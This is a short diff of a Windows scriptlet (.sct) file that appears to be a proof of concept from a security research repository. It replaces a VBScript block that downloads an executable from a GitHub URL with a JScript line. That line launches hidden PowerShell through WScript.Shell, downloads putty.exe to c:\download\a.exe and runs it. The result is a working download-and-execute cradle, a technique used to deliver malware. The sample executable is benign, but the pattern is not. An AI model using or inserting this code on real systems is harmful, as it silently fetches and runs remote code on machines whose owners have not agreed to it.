@@ -10,22 +10,10 @@
 	>
 </registration>
 
-<script language="VBScript">
+<script language="JScript">
 <![CDATA[
 
-		Const adTypeBinary = 1
-		Const adSaveCreateOverWrite = 2
-		Dim http,ado
-		Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
-		http.SetOption 2, 13056
-		http.open "GET","https://github.com/3gstudent/test/raw/master/putty.exe",False
-		http.send
-		Set ado = createobject("Adodb.Stream")
-		ado.Type = adTypeBinary
-		ado.Open
-		ado.Write http.responseBody
-		ado.SaveToFile "c:\download\a.exe"
-		ado.Close
+		new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'",0,true);
 	
 ]]>
 </script>
